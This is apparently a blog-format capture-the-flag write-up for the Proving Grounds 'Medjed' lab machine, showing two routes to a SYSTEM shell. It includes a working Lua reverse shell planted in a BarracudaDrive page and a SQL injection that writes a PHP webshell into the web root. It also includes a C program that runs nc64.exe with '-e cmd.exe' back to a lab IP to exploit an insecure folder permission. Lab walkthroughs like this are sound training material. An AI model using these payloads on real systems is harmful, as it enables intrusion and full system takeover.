---
layout: post
title: "Medjed - Proving Grounds Practice"
summary: "(1st WAY) → BarracudaDrive 6.5 Website → Customize About page to LSP reverse shell → SYSTEM → (2nd WAY) → phpinfo.php to find DOCUMENT_ROOT → Ruby on Rails application SQL Injection → use INTO OUTFILE to put file with SQL Injection → user shell → BarracudaDrive 6.5 → Insecure Folder Permissions → Windows Reverse Shell with C and i686-w64-mingw32-gcc → SYSTEM"
---

# Medjed - Proving Grounds Practice

## 1st Way - Directly SYSTEM
### Nmap
Initial nmap scan revealed SMB, MySQL and HTTP 8000 ports were open.

<img width="1417" height="722" alt="00nmap" src="https://github.com/user-attachments/assets/a9c42c67-02d5-4718-8a1d-bac49d5d2a02" />

### Web Enumeration
Visiting the website revealed `BarracudaDrive 6.5` was in use.

<img width="1287" height="717" alt="01webvers" src="https://github.com/user-attachments/assets/b61d2687-0319-4e4d-92eb-dec468a05120" />

### Exploitation
It was a similar website like `FuguHub`. So at first I created admin user.

<img width="1291" height="674" alt="02setadmin" src="https://github.com/user-attachments/assets/60b8bacc-8e54-46a2-8b11-cf3b742cb24c" />

Then from customize page, I updated about page to lsp reverse shell.
```lsp
<?lsp if request:method() == "GET" then ?>
    <?lsp 
        local host, port = "<IP>", <PORT>
        local socket = require("socket")
        local tcp = socket.tcp()
        local io = require("io")
        local connection, err = tcp:connect(host, port)
        
        if not connection then
            print("Error connecting: " .. err)
            return
        end
        
        while true do
            local cmd, status, partial = tcp:receive()
            if status == "closed" or status == "timeout" then break end
            if cmd then
                local f = io.popen(cmd, "r")
                local s = f:read("*a")
                f:close()
                tcp:send(s)
            end
        end
        
        tcp:close()
    ?>
<?lsp else ?>
    Wrong request method, goodBye! 
<?lsp end ?>
```

<img width="1290" height="869" alt="03customize" src="https://github.com/user-attachments/assets/3fe6ec59-a331-417a-b0f8-702ab297b154" />

Visiting the about page got me SYSTEM shell.

<img width="1355" height="731" alt="04revshell" src="https://github.com/user-attachments/assets/b261d56d-d82e-4a9e-ab64-fec8a4669f90" />

<img width="666" height="564" alt="05gg" src="https://github.com/user-attachments/assets/266d7dbb-c767-469a-8b25-8fb6279c6135" />

## 2nd way - Intended Way
### Enumeration
Nmap also revealed two additional web ports were open.

<img width="847" height="696" alt="00nmap2" src="https://github.com/user-attachments/assets/38a5bc1b-5497-4056-99d1-1eec2b45fdd7" />

<img width="1103" height="163" alt="00nmap3" src="https://github.com/user-attachments/assets/d40d8f7d-dead-4a99-8f6a-1df8815b8931" />

Website at port 45332 was simple website that had no input points.

<img width="1161" height="581" alt="01 0 quiz web" src="https://github.com/user-attachments/assets/879af4ea-f003-479e-a2bc-e30997ae1ea5" />

Directory brute force revealed `phpinfo.php` file.

<img width="1020" height="656" alt="01 1 phpinfo dir" src="https://github.com/user-attachments/assets/73108926-b7fc-4639-b73d-f2cd5cbc3bb2" />

I noted down the `DOCUMENT_ROOT` variable.

<img width="1169" height="603" alt="01 2 document root" src="https://github.com/user-attachments/assets/c3f7c9ae-a65d-4850-971c-fb09526c0b8b" />

Other website at 33033 redirected us to user page. One of the users had a different description.

<img width="1288" height="799" alt="02sugoid" src="https://github.com/user-attachments/assets/87628036-daed-412f-9e8d-286ed3d40c6a" />

I could not login but there was a forgot password button. It required a reminder and I tried paranoid for the user and it worked. I logged in.

<img width="1288" height="687" alt="03paranoid" src="https://github.com/user-attachments/assets/a1a13ae5-7bc3-4e48-a385-9d7c985d2d6a" />

<img width="1290" height="761" alt="04loggedin" src="https://github.com/user-attachments/assets/cff0f51d-366a-43e4-9618-2327a9c06ad6" />

There was an experimental feature called request profile slug.

<img width="1262" height="740" alt="05user slug" src="https://github.com/user-attachments/assets/660c40a1-2a33-47d4-8bad-b51ddd10b0d5" />

So I tested SQL injection there and it worked.

<img width="1276" height="503" alt="06test" src="https://github.com/user-attachments/assets/dad8f9ef-e89e-4367-8e8e-51e7a910b32a" />

<img width="1266" height="678" alt="07sqli" src="https://github.com/user-attachments/assets/27ed4ada-2c5e-47ff-a65f-34005279f06d" />

### Exploitation
So I used `INTO OUTFILE` query to put a webshell to DOCUMENT_ROOT.
```sql
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

<img width="1139" height="541" alt="08put file" src="https://github.com/user-attachments/assets/da90bde8-536b-439d-9da9-35bc695c43d2" />

And I was able to execute commands.

<img width="489" height="346" alt="09gg" src="https://github.com/user-attachments/assets/29ab12ae-3dc3-4a18-b0f7-b024586a5407" />

I transfered `nc64.exe` and executed it.

<img width="1015" height="111" alt="10nc64" src="https://github.com/user-attachments/assets/3a748487-68cd-4e50-b89f-58f2faf67e17" />

Then simply got a reverse shell.

<img width="734" height="649" alt="11local" src="https://github.com/user-attachments/assets/39884a53-dd9b-45ac-b74d-aa63ea11c825" />

### Privilege Escalation
As we know `BarracudaDrive 6.5` was in use which was vulnerable to Insecure Folder Permissions.
I found an exploit description online (http[s://www.exploit-db.com/exploits/48789](https://www.exploit-db.com/exploits/48789)).

All I had to do is replace `C:\bd\bd.exe` with a malicious file and execute `shutdown /r /t 0` to reboot.

So at first I created a malicious C file and compiled it with `i686-w64-mingw32-gcc`.
```c
#include <stdlib.h>

int main(void){
     system("C:\\xampp\\htdocs\\nc64.exe 192.168.45.167 445 -e cmd.exe");
    return 0;
}
```
```bash
i686-w64-mingw32-gcc exp.c -l ws2_32 -o bd.exe
```

<img width="612" height="192" alt="13expc" src="https://github.com/user-attachments/assets/8c3f5821-829c-4f29-97d4-421e6c704665" />

Then I moved normal `bd.exe` to `bd.exe.bat` and transfered malicious file.

<img width="674" height="596" alt="14changed" src="https://github.com/user-attachments/assets/788f0264-fa76-4f5c-8e44-847bbc042e55" />

Then set a nc reverse shell listener and rebooted the machine.

<img width="254" height="51" alt="15reboot" src="https://github.com/user-attachments/assets/5caca9eb-fdf8-41a8-ba06-9c1967e4bd66" />

After some time, I got a SYSTEM shell.

<img width="690" height="616" alt="16gg" src="https://github.com/user-attachments/assets/32350341-9f9f-41a7-a0c0-78fccc2eb41b" />
